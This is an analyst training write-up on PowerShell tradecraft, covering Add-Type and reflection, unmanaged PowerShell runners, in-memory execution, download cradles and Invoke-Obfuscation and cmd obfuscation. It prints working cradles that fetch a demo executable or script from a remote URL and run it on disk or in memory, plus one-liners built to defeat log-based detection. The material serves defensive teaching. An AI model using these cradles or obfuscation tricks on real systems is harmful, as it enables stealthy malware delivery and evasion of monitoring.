# PowerShell: Greatest Hits Vol. 1

PowerShell is a command-line shell and scripting language based on the .NET Framework which is installed by default on Windows 7/2008 R2 and later.  It has become a major component of adversary tradecraft and is increasingly seen in targeted attacks as well as commodity malware.

It's important as an analyst to have a conceptual understanding of why PowerShell is so valuable to adversary operations and how it is used to accomplish specific objectives.  This training document will review and demonstrate the PowerShell capabilities that offer actors the greatest tactical advantage:


|Capability|Description|
|-|-|
|[Scope of Influence](#scope-of-influence)|Trusted script host and interactive administration tool|
|[Dynamic Code Generation](#dynamic-code-generation)|Compiles and runs C# code to interact with Windows APIs|
|[Process Agnostic](#process-agnostic)|Uses custom and native programs to run in any process|
|[Memory-Only Execution](#memory-only-execution)|Uses memory modules and reflective injection to stay off disk|
|[Cradle Options](#cradle-options)|Multiple ways to download to disk or memory|
|[Command Obfuscation](#command-obfuscation)|Obscuring commands and arguments in logs using string operations|

<br>

## Scope of Influence

- [Script Host Program](#script-host-program)
- [Interactive Administration](#interactive-administration)
- [Signed Binary](#signed-binary)

### Script Host Program

Most programs on a system are built for one purpose.  Browsers interpret and display web pages, media players play media files, and text editors manipulate text files. These programs have a very small influence over the systems on which they run.

PowerShell is a Script Host---a program that reads in instructions and executes them on the system. Script host programs are administration tools specifically designed to interact with and make changes to the entire OS and filesystem.  These programs can perform a wide range of tasks on a system which makes them very useful for adversary operations.

Here is a list of Windows scripting technologies, their script hosts, and the ways they interact with the OS:

|Technology|Script Host|File Types|Access Types|
|-|-|-|-|
|[Batch Files](#batch-files)|`cmd.exe`|`.bat` `.cmd` `.btm`|CLI|
|[VBScript/JScript](#vbscript-and-jscript)|`wscript.exe` `cscript.exe`|`.vbs` `.vbe` `.js` `.jse` `.hta` `.wsf` `.sct`|COM, .NET, WinAPI|
|[Visual Basic for Applications](#visual-basic-for-applications)|`winword.exe` `excel.exe` `powerpnt.exe`|`.docm` `xlsm` `.pptm`|COM, .NET, WinAPI|
|[PowerShell](#powershell)|`powershell.exe` `powershell_ise.exe`|`.ps1` `.psm1` `.psd1`|CLI, COM, .NET, WinAPI|


### Interactive Administration

Not only is PowerShell a script host with enormous influence over a system, it is also a command-line shell and scripting language resulting from the evolution of interactive system administration tools for the Windows OS:

|Tool|Interactive Environment|Scripting Environment|Command-Line Tools|COM Objects|.NET|
|-|-|-|-|-|-|
|Command Prompt|Yes|Yes|No|No|No|
|Windows Script Host|No|Yes|Yes|Yes|No|
|VBA|No|Yes|Yes|Yes|Yes|
|PowerShell|**Yes**|**Yes**|**Yes**|**Yes**|**Yes**|

<br>

By integrating loops, conditional statements, and control statements, both system administrators and malware authors are able to use scripting to automate actions on a system.  This also blends in with regular administration work and is difficult to detect with traditional security tools.

### Signed Binary

On Windows 7 and later versions, all native portable executable (PE) files, including EXEs and DLLs, that are running in processes, device drivers, and services should be signed by Microsoft.

PowerShell script host programs `powershell.exe` and `powershell_ise.exe` are legitimate OS binaries.  Each one is signed with a valid, trusted certificate which confirms authenticity and origin---Microsoft signs a file to prove it is authentic and a trusted third party (CA) verifies Microsoft is the only one with the private key used to sign it.

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image001.png)<br><br>

## Dynamic Code Generation

PowerShell has several ways to interact with the Windows API:

- [Compile C# Code](#compile-c#-code)
- [Private .NET Methods](#private-.net-methods)
- [Reflection](#reflection)


### Compile C# Code

PowerShell can compile C# code on the fly using the `Add-Type` cmdlet.  The following code, when compiled, uses the [Console.Write](https://docs.microsoft.com/en-us/dotnet/api/system.console.write?view=netframework-4.7.2#System_Console_Write_System_String_) and [Console.ReadLine](https://docs.microsoft.com/en-us/dotnet/api/system.console.readline?view=netframework-4.7.2#System_Console_ReadLine) .NET APIs to read and write strings to and from the console.

First the code is stored and added to the session:

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image002.png)<br><br>

Once the program is compiled, the `GoTeam` .NET type (class) and its functions are available to the session:

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image003.png)<br><br>

You can also use `Add-Type` to compile code that calls Windows API functions.  This makes the CLR load the `kernel32` DLL and makes its `GetCurrentProcessId` function available to the session:

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image004.png)<br>

This method calls the C# compiler `csc.exe` and writes temporary files to disk.

### Private .NET Methods

Another option is using a private .NET method.  As explained [here](https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-2/), you can use [Find-WinAPIFunction](http://gallery.technet.microsoft.com/scriptcenter/Find-WinAPIFunction-4166b223) to look through all assemblies in the current AppDomain and locate an API's module name and type:

```powershell
$GetPid = Find-WinAPIFunction -Module kernel32.dll -FunctionName GetCurrentProcessId
$GetPid = $GetPid[0]
$GetPid.Module.Name
$GetPid.DeclaringType.FullName
```

<br>

Then use the module name and type to create a reference to the internal method:

```powershell
$mscorlib = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and `
    ($_.Location.Split('\')[-1] -eq 'mscorlib.dll')}
$Win32Native = $mscorlib.GetType('Microsoft.Win32.Win32Native')
$GetPidMethod = $Win32Native.GetMethod('GetCurrentProcessId',([Reflection.BindingFlags] 'NonPublic, Static'))
$GetPidMethod.Invoke($null, $null)
```

<br>

Now the session has a reference to the `GetCurrentProcessId` function and can call it using `$GetPidMethod`:

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image005.png)<br><br>


### Reflection

[PSReflect](https://github.com/mattifestation/PSReflect) is a script created by Matt Graeber that uses .NET reflection to dynamically define methods that call Windows API functions.

Here we use it to define a method that calls the `GetCurrentProcessId` function:

```powershell
$Mod = New-InMemoryModule -ModuleName Win32
$FunctionDefinition = (func kernel32 GetCurrentProcessId ([IntPtr]) @())
$Types = $FunctionDefinition | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Kernel32::GetCurrentProcessId()
```

<br>

The function is defined and the API is called from memory without leaving any artifacts on disk:

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image006.png)<br><br>


## Process Agnostic

So... PowerShell processes are script hosts that are signed by Microsoft and have free reign to just about everything on the system.  They are also not limited to the thousands of administrative commands available, but can also compile arbitrary code on-the-fly and run it completely in memory. So we just need to look for powershell processes then, right?  

Wrong.  The PowerShell core library `System.Management.Automation.ni.dll` is a system DLL and therefore can be loaded and used by *any* process to run PowerShell code. This technique is referred to as [Unmanaged PowerShell](https://github.com/leechristensen/UnmanagedPowerShell).  Let's look at two ways to implement this:

- [Custom Programs](#custom-programs)
- [Native Programs](#native-programs)

<br>

To demonstrate, we'll use a simple program called `RunPS` that is based on [PowerPick](https://github.com/PowerShellEmpire/PowerTools) which is a .NET assembly that creates a runspace object, uses it to run PowerShell commands it receives, and returns the results.  This is a basic implementation of what is called a *powershell runner*:

```cs
using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace SharpPick {
	class RunPS {
		public static string RunPS(string cmd) {
			Runspace runspace = RunspaceFactory.CreateRunspace();
			runspace.Open();
			RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
			Pipeline pipeline = runspace.CreatePipeline();

			pipeline.Commands.AddScript(cmd);
			pipeline.Commands.Add("Out-String");
			Collection<PSObject> results = pipeline.Invoke();
			runspace.Close();

			StringBuilder stringBuilder = new StringBuilder();
			foreach (PSObject obj in results) {
				stringBuilder.Append(obj.ToString);
			}
			return stringBuilder.ToString();
		}
		public static void Main() {
			Console.WriteLine("Enter your favorite PowerShell command: ");
			string command = Console.ReadLine();
			string results = RunPS(command);
			Console.Write(results);
		}
	}
}
```

<br>

Save it as `RunPS.cs` and compile it with `csc.exe`:

```powershell
$ref = [psobject].assembly.location
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:RunPS.exe RunPS.cs /reference:$ref 
```


### Custom Programs

Compiling this code creates a .NET executable that can execute any PowerShell commands you give it.  Close out all PowerShell processes and run the program with Command Prompt to test it out:

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image007.png)<br><br>

We can even use the `RunPS.exe` program to list all the processes that currently have the `System.Management.Automation.ni.dll` DLL loaded:

```powershell
Get-Process | ?{$_.Modules.ModuleName -Match 'System.Management.Automation'}
```
<br>

Notice that `RunPS` is the only process using the  `System.Management.Automation.ni.dll` DLL.  In fact it is using it to run this very command:

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image008.png)<br><br>

### Native Programs

There are many native Windows programs that call the `Assembly.Load()` method and therefore can also be used to compile and run our .NET executable. 

By putting our C# code into a project file named `assembly.xml`, we can get MSBuild.exe to compile the `RunPS` program and run it:

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image009.png)<br><br>

Again, notice that `MSBuild` is the only process using the `System.Management.Automation.ni.dll` DLL.

## Memory-Only Execution

PowerShell's ability to leverage the Windows API and the .NET Framework provide adversaries with two primary methods for operating completely in memory to avoid leaving artifacts on disk that could lead to detection and analysis:

- [Memory Only Modules](#memory-only-modules)
- [Reflective Injection](#reflective-injection)


### Memory-Only Modules

PowerShell is built upon the .NET Framework so it can call .NET methods such as `Load()` which allows an executable to be loaded and run in memory.  This capability is commonly used to run untrusted programs inside a trusted process.

The following reads the bytes of `GoTeam.exe` into memory, converts to Base64, loads it and runs it in memory:

```powershell
$bytes = [System.IO.File]::ReadAllBytes("GoTeam.exe")
$B64 = [System.Convert]::ToBase64String($bytes)
[Reflection.Assembly]::Load([Convert]::FromBase64String($B64)).EntryPoint.Invoke($Null, $Null)
```

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image022.png)<br><br>

### Reflective Injection

PowerSploit's `Invoke-ReflectivePEInjection` uses the Windows API to load EXEs or DLLs from memory rather than from disk.  We can simulate this technique by writing `GoTeam.exe` into memory with the `New-InjectedThread` function from Jared Adkinson's [PSReflect-Functions](https://github.com/jaredcatkinson/PSReflect-Functions):

```powershell
$bytes = [System.IO.File]::ReadAllBytes("GoTeam.exe")
New-InjectedThread -Id $pid -ByteArray $bytes
```

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image018.png)<br>

The executable is now written to a memory space inside the PowerShell process.

A common use of these methods is to load a file into memory from over the network so that the file executing is never written to disk, and therefore is never inspected by Antivirus/EDR tools.  This is accomplished using a *cradle*.


## Cradle Options

**Cradle** is the name given to one or more PowerShell commands designed to download code from a remote system and execute it:

- [Download to Disk](#download-to-disk)
- [Download to Memory](#download-to-memory)

### Download to Disk

The following code downloads the `GoTeam.exe` program, gives it a random name, saves and executes it with `Invoke-Item`:

```powershell
$rand = new-object random
$num=$rand.next(1000, 282133)
$wc=new-object System.Net.WebClient
$payload='https://s3.amazonaws.com/exercise-pcap-download-link/GoTeam.exe'
$path=$env:public+'\'+$num+('.ex'+'e')
$wc.DownloadFile($payload.ToString(),$path)
Invoke-Item $path
```

The program, now named `56835.exe`, runs from the `$env:public` directory:

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image021.png)<br><br>

### Download to Memory

The following commands will download the `GoTeam.exe` program into memory and run it using `[Reflection.Assembly]::Load()`:

```powershell
$uri = 'https://s3.amazonaws.com/exercise-pcap-download-link/GoTeam.exe'
$exe = Invoke-WebRequest -Uri $uri
$Base64 = [System.Convert]::ToBase64String($exe.Content)
[Reflection.Assembly]::Load([Convert]::FromBase64String($Base64)).EntryPoint.Invoke($Null, $Null)
```

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image020.png)<br><br>

After this last command, the `GoTeam.exe` program will be running inside the memory space of the PowerShell process. There is no copy of the file on disk, no `GoTeam.exe` processes running, and no `GoTeam.exe` modules shown as loaded by the PowerShell process.

Another option is to download and run the `GoTeam.ps1` script which contains an encoded copy of the `GoTeam.exe` program. This command runs it in memory using `Invoke-Expression`:

```powershell
$wc = New-Object Net.WebClient
$wc.DownloadString("https://s3.amazonaws.com/exercise-pcap-download-link/GoTeam.ps1") | IEX
```

Again, the `GoTeam.exe` program runs in memory:

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image019.png)<br><br>

Neither the `GoTeam.ps1` script or the `GoTeam.exe` program are available for inspection on disk, but are able to run their code in memory inside the `powershell.exe` process.  Because detection of this technique relies heavily on logs and network artifacts, it is often used in combination with various forms of obfuscation.

## Command Obfuscation

Analysts and signature-based tools regularly search logs and network traffic for suspicious commands and strings that may indicate malicious activity.  Command obfuscation techniques are used to conceal a command's functionality and deter analysis without affecting the malicious program's original functionality:

- [With PowerShell](#with-powershell)
- [With Command Prompt](#with-command-prompt)


### With PowerShell

PowerShell tools such as [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) and [Obfuscated Empire](https://github.com/cobbr/ObfuscatedEmpire) can be used to obscure the way PowerShell commands appear on the command line. [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) has several different methods that can be used alone or in combination to obfuscate commands:

|Method|Description|
|-|-|
|Token|Concatenates and/or reorders strings, arguments, variables, commands, and whitespace|
|String|Concatenates, reorders, and/or reverses entire command|
|Encoding|Encodes entire command in ASCII, Hex, Octal, Binary, SecureString, BXOR, Special Characters, or whitespace|
|Launcher|Uses various launching techniques such as wmic, rundll32, mshta, clip, echo|

<br>

Depending on how many layers of obfuscation are used, you may be able to recognize parts of the original command:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image035.png)<br><br>

Adding the hex encoding option gets rid of all original syntax:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image036.png)<br><br>

Many more layers of obfuscation can be added but we'll stop here for this example.

Now when we pass `powershell.exe` the obfuscated command, it executes as intended:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image039.png)<br><br>

But the command that ran is no longer recognizable in the Security logs:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image037.png)<br><br>

Or the transcript logs:

![](images/Review%20of%20Windows%20Scripting%20Technologies/image038.png)<br><br>

### With Command Prompt

Calls to PowerShell can also be obfuscated by using several different methods of [Dosfucation](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf) with the Command Prompt:

|Method|Description|
|-|-|
|[Junk Code](#junk-code)|Adding escape characters to obscure commands and arguments|
|[Environment Variables](#environment-variables)|Used to avoid the presence of key strings|
|[For Loop Encoding](#for-loop-encoding)|Looping through data to build key strings|
|[Character Substitution](#character-substitution)|Modifying characters in strings to hide key strings|


#### Junk Code

Escape characters such as commas, semicolons, carrots, and double quotes can be used to obscure calls to PowerShell:

```powershell
,;,p^o^wER^s^he^l^l WR^i^te^-h^O^sT ""^-F^o^r^e ""G^r^e ""P^ow^e^r^S^h^ell "e"x"e"cu"t"ed"!
```

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image010.png)<br><br>

#### Environment Variables

Environment variables are also leveraged to avoid using specific strings:

```powershell
%PUBLIC:~9,1%%windir:~7,1%W%PSModulePath:~27,7% Wri%TMP:~32,2%-Ho%PROCESSOR_IDENTIFIER:~26,2% -Fo%ProgramData:~4,1%e G%ProgramW6432:~4,1%%ProgramW6432:~14,1% %PUBLIC:~9,1%%windir:~7,1%W%PSModulePath:~27,7% %ProgramW6432:~14,1%x%ProgramW6432:~14,1%cut%ProgramW6432:~14,1%d!
```

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image011.png)<br><br>

#### For Loop Encoding

The following For loop builds the `powershell Write-Host -Fore Gre powershell executed!` string from letters in the `u` variable:

```powershell
cmd /V:ON /C "set u=h/Tscumi-LwxaGveRopdF p! && FOR %A IN (18 17 10 15 16 3 0 15 9 9 21 10 16 7 2 15 8 0 17 3 2 21 8 20 17 16 15 21 13 16 15 21 18 17 10 15 16 3 0 15 9 9 21 15 11 15 4 5 2 15 19 23 27) DO set f=!f!!u:~%A,1!&& IF %A==27 CALL %f:~-52%"
```

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image012.png)<br><br>

When the loop finishes building the string, it executes it:

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image013.png)<br><br>


This loop builds the same string using the `u` variable which is the command in reverse order:

```
cmd /V:ON /C "set r=!detucexe llehsrewop erg erof- tsoh-etirw llehsrewop&& FOR /L %A IN (52 -1 0) DO set f=!f!!r:~%A,1!&&IF %A==0 CALL %f:~-52%"
```

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image014.png)<br><br>

When the loop finishes building the string, it executes it:

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image015.png)<br><br>


#### Character Substitution

Individual characters can be substituted after variables have been defined to completely obfuscate a command.  The original string in variable `c` is modified multiple times to create the command string and execute it with `CALL`:

```powershell
cmd /V:ON /C "set c=AjwQ#yhQll (riZQ-HjyZ -Fj#Q G#Q Aj(Q#yhQll QxQcuZQd! && set d=!c:Q=e! && set e=!d:Z=t! && set f=!e:j=o! && set g=!f:y=s! && set h=!g:#=r! && set k=!h:(=W! && CALL !k:A=p!"
```

![](images/PowerShell%20Greatest%20Hits%20Vol%201/image016.png)<br><br>


## Summary

- PowerShell is a trusted program providing an interactive command-line shell and scripting language for automating a wide range of administrative tasks

- PowerShell has access to .NET & Windows APIs and can be used to compile and run C# code on the fly

- PowerShell code can run inside any process, has multiple options for downloading content from remote systems, and can execute this code in memory without ever touching disk

- PowerShell tools such as Invoke-Obfuscation can perform multiple string operations on commands to conceal their purpose and deter analysis
